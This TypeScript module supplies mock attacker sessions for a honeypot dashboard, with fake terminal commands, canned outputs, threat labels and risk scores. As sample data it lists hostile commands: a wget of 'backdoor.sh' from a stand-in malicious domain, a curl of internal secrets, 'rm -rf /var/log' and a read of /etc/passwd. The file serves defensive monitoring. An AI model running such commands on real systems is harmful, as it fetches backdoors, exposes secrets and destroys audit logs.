import { HoneypotSession, TerminalCommand, SessionMetrics } from "./types";

const generateCommand = (
  id: string,
  command: string,
  threat: TerminalCommand["threat"],
  riskIncrease: number,
  offset: number,
): TerminalCommand => {
  const outputs: Record<string, string> = {
    ls: "bin   boot  dev  etc  home  lib  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var",
    whoami: "root",
    id: "uid=0(root) gid=0(root) groups=0(root)",
    pwd: "/root",
    "sudo su": "root@corp-server:~#",
    "sudo -l":
      "User root may run the following commands on corp-server:\n    (ALL) ALL",
    "cat /etc/passwd":
      "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin",
    "nmap -sV localhost":
      "Starting Nmap 7.80\nNmap scan report for localhost (127.0.0.1)\nHost is up (0.00015s latency).\nPORT   STATE SERVICE\n22/tcp open  ssh",
    "curl http://internal-api:8080/secrets":
      "API_KEY=sk-1234567890\nDB_PASSWORD=secure_pass123",
    "ps aux":
      "root        1  0.0  0.1   4096  1024 ?   Ss   12:00   0:00 /sbin/init\nroot      100  0.0  0.2   8192  2048 ?   S    12:05   0:00 sshd: /usr/sbin/sshd [listener]",
    "rm -rf /var/log": "Operation completed.",
    "wget http://malicious-domain.com/backdoor.sh":
      "--2024-01-17 12:15:30-- http://malicious-domain.com/backdoor.sh\nResolving malicious-domain.com... 192.168.1.100\nConnecting to malicious-domain.com... connected.",
  };

  return {
    id,
    timestamp: Date.now() - offset,
    command,
    output: outputs[command] || `Command executed: ${command}`,
    threat,
    riskIncrease,
  };
};

export const mockSessions: HoneypotSession[] = [
  {
    id: "session-001",
    startTime: Date.now() - 15 * 60000,
    lastActivity: Date.now() - 2 * 60000,
    riskScore: 85,
    entryVector: "console",
    attackStage: "escalation",
    isActive: true,
    commands: [
      generateCommand("cmd-1", "whoami", "normal", 0, 14 * 60000),
      generateCommand("cmd-2", "id", "reconnaissance", 5, 13 * 60000),
      generateCommand(
        "cmd-3",
        "sudo -l",
        "privilege-escalation",
        15,
        12 * 60000,
      ),
      generateCommand(
        "cmd-4",
        "sudo su",
        "privilege-escalation",
        20,
        11 * 60000,
      ),
      generateCommand(
        "cmd-5",
        "cat /etc/passwd",
        "credential-access",
        10,
        10 * 60000,
      ),
      generateCommand(
        "cmd-6",
        "nmap -sV localhost",
        "reconnaissance",
        8,
        9 * 60000,
      ),
    ],
    threatLevel: "high",
    behaviorTags: [
      "Manual Recon",
      "Privilege Escalation Focused",
      "Credential Harvesting",
    ],
    deceptionStrategies: [
      "Fake Success",
      "Delayed Response",
      "Partial Success",
    ],
  },
  {
    id: "session-002",
    startTime: Date.now() - 8 * 60000,
    lastActivity: Date.now() - 1 * 60000,
    riskScore: 45,
    entryVector: "api",
    attackStage: "reconnaissance",
    isActive: true,
    commands: [
      generateCommand("cmd-1", "ls", "normal", 1, 7 * 60000),
      generateCommand("cmd-2", "pwd", "normal", 0, 6 * 60000),
      generateCommand("cmd-3", "whoami", "reconnaissance", 3, 5 * 60000),
      generateCommand("cmd-4", "ps aux", "reconnaissance", 5, 4 * 60000),
    ],
    threatLevel: "medium",
    behaviorTags: ["Automated Scanner", "Information Gathering"],
    deceptionStrategies: ["Fake Success"],
  },
  {
    id: "session-003",
    startTime: Date.now() - 45 * 60000,
    lastActivity: Date.now() - 42 * 60000,
    riskScore: 120,
    entryVector: "debug",
    attackStage: "persistence",
    isActive: false,
    commands: [
      generateCommand("cmd-1", "whoami", "normal", 0, 44 * 60000),
      generateCommand(
        "cmd-2",
        "sudo -l",
        "privilege-escalation",
        15,
        43 * 60000,
      ),
      generateCommand(
        "cmd-3",
        "curl http://internal-api:8080/secrets",
        "credential-access",
        20,
        42 * 60000,
      ),
      generateCommand(
        "cmd-4",
        "wget http://malicious-domain.com/backdoor.sh",
        "persistence",
        25,
        41 * 60000,
      ),
      generateCommand(
        "cmd-5",
        "rm -rf /var/log",
        "destructive",
        30,
        40 * 60000,
      ),
    ],
    threatLevel: "critical",
    behaviorTags: [
      "Advanced Attacker",
      "Multi-Stage Attack",
      "Log Destruction",
    ],
    deceptionStrategies: [
      "Fake Success",
      "Broken Tool Illusion",
      "Delayed Response",
    ],
  },
  {
    id: "session-004",
    startTime: Date.now() - 5 * 60000,
    lastActivity: Date.now() - 3 * 60000,
    riskScore: 32,
    entryVector: "console",
    attackStage: "initial-access",
    isActive: true,
    commands: [
      generateCommand("cmd-1", "ls", "normal", 1, 4 * 60000),
      generateCommand("cmd-2", "pwd", "normal", 0, 3 * 60000),
    ],
    threatLevel: "low",
    behaviorTags: ["Script Kiddie", "Basic Exploration"],
    deceptionStrategies: ["Fake Success"],
  },
];

export const getSessionMetrics = (): SessionMetrics => {
  const totalSessions = mockSessions.length;
  const activeSessions = mockSessions.filter((s) => s.isActive).length;
  const allCommands = mockSessions.flatMap((s) => s.commands);
  const totalCommands = allCommands.length;
  const averageRiskScore =
    mockSessions.reduce((sum, s) => sum + s.riskScore, 0) / totalSessions;

  const threatDistribution = {
    reconnaissance: allCommands.filter((c) => c.threat === "reconnaissance")
      .length,
    credentialAccess: allCommands.filter(
      (c) => c.threat === "credential-access",
    ).length,
    privilegeEscalation: allCommands.filter(
      (c) => c.threat === "privilege-escalation",
    ).length,
    persistence: allCommands.filter((c) => c.threat === "persistence").length,
    destructive: allCommands.filter((c) => c.threat === "destructive").length,
  };

  return {
    totalSessions,
    activeSessions,
    totalCommands,
    averageRiskScore: Math.round(averageRiskScore),
    threatDistribution,
  };
};

export const getSessionById = (id: string): HoneypotSession | undefined => {
  return mockSessions.find((s) => s.id === id);
};

export const getThreatColor = (threat: string): string => {
  switch (threat) {
    case "critical":
      return "text-red-600";
    case "high":
      return "text-orange-600";
    case "medium":
      return "text-yellow-600";
    case "low":
      return "text-green-600";
    default:
      return "text-gray-600";
  }
};

export const getThreatBgColor = (threat: string): string => {
  switch (threat) {
    case "critical":
      return "bg-red-50";
    case "high":
      return "bg-orange-50";
    case "medium":
      return "bg-yellow-50";
    case "low":
      return "bg-green-50";
    default:
      return "bg-gray-50";
  }
};

export const formatDuration = (startTime: number, endTime: number): string => {
  const seconds = Math.floor((endTime - startTime) / 1000);
  const minutes = Math.floor(seconds / 60);
  const hours = Math.floor(minutes / 60);

  if (hours > 0) {
    return `${hours}h ${minutes % 60}m`;
  } else if (minutes > 0) {
    return `${minutes}m ${seconds % 60}s`;
  } else {
    return `${seconds}s`;
  }
};

export const formatTime = (timestamp: number): string => {
  const date = new Date(timestamp);
  return date.toLocaleTimeString();
};
